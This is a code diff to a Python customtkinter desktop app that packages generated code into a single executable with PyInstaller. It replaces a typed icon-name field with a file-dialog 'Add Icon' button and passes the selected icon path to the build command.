@@ -7,12 +7,13 @@ import string
 import subprocess
 import threading
 import time
+from tkinter import filedialog
 
 import customtkinter
 import requests
 from PIL import Image
 
-VERSION = '1.2.5'
+VERSION = '1.2.6'
 
 class App(customtkinter.CTk):
     def __init__(self):
@@ -56,6 +57,7 @@ class App(customtkinter.CTk):
         self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
         self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
         self.font = "Supernova"
+        self.iconpath = None
 
         self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
@@ -180,7 +182,8 @@ class App(customtkinter.CTk):
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=310)
         self.fileopts.set("File Options")
 
-        self.icon = customtkinter.CTkEntry(self.home_frame, width=250, placeholder_text="Icon Name", font=customtkinter.CTkFont(size=33, family=self.font))
+        self.icon = customtkinter.CTkButton(self.home_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
+                                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
         self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=310)
         self.icon.configure(state="disabled")
 
@@ -272,6 +275,15 @@ class App(customtkinter.CTk):
             self.icon.configure(state="normal")
         else:
             self.icon.configure(state="disabled")
+
+    def get_icon(self):
+        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
+        self.icon.configure(text="Added Icon")
+        self.home_frame.after(3500, self.reset_icon_button)
+
+    def reset_icon_button(self):
+        self.icon.configure(self.home_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
+                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
 
     def update_config(self, event):
         self.updated_dictionary = {
@@ -383,11 +395,10 @@ class App(customtkinter.CTk):
         return code
 
     def compile_file(self, filename):
-        exeicon = self.icon.get()
-        if exeicon == "":
+        if self.iconpath is None:
             exeicon = "NONE"
         else:
-            exeicon = f"{self.basefilepath}\\{self.icon.get()}.ico"
+            exeicon = self.iconpath
         try:
             subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
                             '--hidden-import', 'base64',
